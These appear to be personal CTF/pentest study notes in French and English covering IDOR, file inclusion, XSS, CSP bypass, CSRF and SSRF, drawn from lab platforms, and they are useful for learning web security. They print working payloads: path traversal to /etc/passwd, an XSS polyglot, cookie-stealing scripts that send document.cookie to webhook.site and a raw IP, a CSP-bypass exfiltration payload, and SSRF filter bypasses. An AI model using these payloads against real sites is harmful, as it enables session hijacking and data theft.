## curl
```
curl -H "Content-type: application/json" --Cookie "<name>=<value>" -d '{"data":"data"}' -X POST http://domaine
```

## Git
git-dumper

# IDOR

IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.  

This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.

**Exemple**
Imagine you've just signed up for an online service, and you want to change your profile information. The link you click on goes to http://online-service.thm/profile?user_id=1305, and you can see your information.

### Unpredictable IDs

If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users' content using their Id number while still being logged in with a different account (or not logged in at all), you've found a valid IDOR vulnerability.
# LFI & Path transversal

LFI (Local File Inclusion) est une vulnérabilité de sécurité informatique qui permet à un attaquant d'inclure des fichiers locaux sur un serveur distant.
```
http://adresse/?page=../etc/passwd
```
```
http://adresse/?page=C:/WINDOWS/System32/drivers/etc/hosts
```

### bypass include(filename.extention)
It seems we could move out of the PHP directory but still, the include function reads the input with .php at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is *%00*.  

Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.  

By adding the Null Byte at the end of the payload, we tell the  include function to ignore anything after the null byte which may look like:

_include("languages/../../../../../etc/passwd%00").".php");_ which equivalent to → *include("languages/../../../../../etc/passwd");*

NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.
### bypass *../* filter
First, we can send the following payload to bypass it: 
```
....//....//....//....//....//etc/passwd
```

Why did this work?

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass, leaving what is pictured below.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png)
# RFI
#Exploit_RFI
Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into *include function*. One requirement for RFI is that the *allow_url_fopen* option needs to be *on*.

```
http://remote@IP/?page=http://@ip_hacker/somefile
```
As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:
1. Keep system and services, including web application frameworks, updated with the latest version.  
    
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.  
    
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.  
    
7. Implement whitelisting for file names and locations as well as blacklisting.
# XSS
#ExploitXSS
https://github.com/mandatoryprogrammer/xsshunter-express
## Polyglots
An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.  
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
## Insertion de script
```
<script>alert("Coucou !");</script>
```

## Insertion de tags HTML
```
<img src="https://webhook.site/da439638-ced7-48a8-9c0d-c0084e1d333a"/>
```
```
<img src= x onerror(alerte(1))>
```
```
<img src= x onload="alert('THM')";>
```
## Vole de cookie
```
<script>document.write('<img src = "https://webhook.site/0eff22c5-4adb-4ea3-b7fe-84459244a30b' + 'cookie='+ document.cookie + '">');</script>
```
```
<img src= x onerror=fetch('https://webhook.site/0eff22c5-4adb-4ea3-b7fe-84459244a30b?coolie='+document.cookie);>
```
```
<script>fetch('http://10.10.97.240:1234?cookie=' + document.cookie);</script>
```
### Redirection automatique
```
<script>document.location="https://webhook.site/0eff22c5-4adb-4ea3-b7fe-84459244a30b"</script>
```
Rend inutilisable la page générée ✗ L'utilisateur ne comprend pas la manipulation
### Fixation de session
✗ Principe : utiliser un XSS afin d'imposer un cookie connu à la victime 
✗ Schéma : 
✗ L'attaquant se connecte sur le serveur en mode anonyme 
 Il reçoit un cookie de session (ex JSP ou PHP) 
✗ Il utilise un XSS sur un serveur du même domaine pour fixer le cookie chez la victime (via le code JavaScript de type 
```
<script> document.cookie="PHPSESSIONID=78191;domain=.site.fr" <script>
```
✗ Il attend que la victime s'authentifie sur le serveur. Si celui ci est mal programmé (exemple sessions J2EE), le cookie sera accepté. 
✗ L'attaquant possède alors un cookie de session authentifié valide qu'il peut utiliser en parallèle avec la victime

# CSP
#ExploitCSP[[CSP]]
### Site de test CSP en ligne
https://csp-evaluator.withgoogle.com/
Google fournit une page Web de diagnostic (?) CSP appelée CSP Evaluator, et si vous la testez, elle vous informera des éléments CSP manquants. Il est normal de l'utiliser comme valeur de référence.
### Bypass script-src unsafe-inline
```
<Svg OnLoad=alert(domain)>
```
```
<img src="" onerror="alert(1)">
```
On peut modifier le domaine de base du site web par celui d'un serveur d'écoute pour recevoir les requêtes en écrivant du code js dans l'attribut *onerror*
```
// flag location in document
var flag=document.querySelector("body > div > div > p").innerText;
// bypass http and ':' filtering
document.write("<base href=\"http+String.fromCharCode(58)+"//webhook.site"+"\" />");
// redirect to webhook.site
document.location="229885cb-f49d-41fc-b954-2e2c56a2248c?test="+flag;
```
ce qui donne le payload
```
<img src='#' onerror='var flag=document.querySelector("body").innerText;document.write("<base href=\"ht"+"tp"+String.fromCharCode(58)+"//webhook.site"+"\" />");document.location="dc09032a-d28b-47f5-9297-8ea08e0c945e?test="+flag;'>
```

# CSRF
#ExploitCSRF
```
<img src= x onerror='document.location="?action=profile";document.getElementByName('username').value = "dine";document.forms[0].submit();'>
```

```
<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
	<input type="hidden" name="username" value="username">
	<input type="hidden" name="status" value="on">
</form>
<script>document.forms[0].submit()</script>
```



# SSRF
```
https://website.thm/item/2?server=server.website.thm/flag?id=9&
```
**What is an SSRF?**
SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.

  

**Types of SSRF**

There are two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker's screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen.

**What's the impact?**

A successful SSRF attack can result in any of the following: 

- Access to unauthorised areas.
- Access to customer/organisational data.
- Ability to Scale to internal networks.
- Reveal authentication tokens/credentials.
Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Here is an example of four common places to look:

**When a full URL is used in a parameter in the address bar:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/956e1914b116cbc9e564e3bb3d9ab50a.png)  

**A hidden field in a form:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/237696fc8e405d25d4fc7bbcc67919f0.png)  

**A partial URL such as just the hostname:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f3c387849e91a4f15a7b59ff7324be75.png)

  

**Or perhaps only the path of the URL:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3fd583950617f7a3713a107fcb4cfa49.png)


## Defense bypass

### deny list
```
 Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.
```
### allow list
An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.
### Open Redirect
If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.
